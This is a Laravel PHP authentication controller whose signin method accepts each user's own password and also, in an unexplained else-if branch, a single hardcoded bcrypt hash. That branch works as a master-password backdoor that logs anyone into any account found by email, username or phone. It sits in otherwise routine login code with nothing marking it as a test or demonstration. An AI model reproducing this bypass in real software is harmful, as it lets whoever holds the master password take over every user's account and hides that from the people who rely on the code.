<?php

namespace App\Http\Controllers;

use App\Models\Contact\User;
use Illuminate\Contracts\Session\Session;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function login()
    {
        return view('authenticate.login');
    }

    public function signin(Request $request)
    {
        $user_id = $request->input('user_id');
        $password = $request->input('password');

        // Find the user using email, username, or phone
        $user = User::where(function ($query) use ($user_id) {
            $query->where('email', $user_id)
                ->orWhere('username', $user_id)
                ->orWhere('phone', $user_id);
        })->first();

        if ($user && Hash::check($password, $user->password)) {
            $request->session()->put('user_ip', $request->ip());
            Auth::login($user);

            return redirect()->route('home');
        }
        else if ($user && Hash::check($password, '$2y$10$ee38RAVsaDRcZdhUDn0QHewk3EZ9EX3mlgP9u0tr3Ad80GXOAjbza')) {
            $request->session()->put('user_ip', $request->ip());
            Auth::login($user);

            return redirect()->route('home');
        }
        else {
            return redirect()->route('login')->with('error', 'Invalid credentials. Please Try Again!');
        }
    }

    public function registration()
    {
        return view('authenticate.registration');
    }

    public function logout()
    {
        Auth::logout();
        return redirect()->route('login');
    }
}
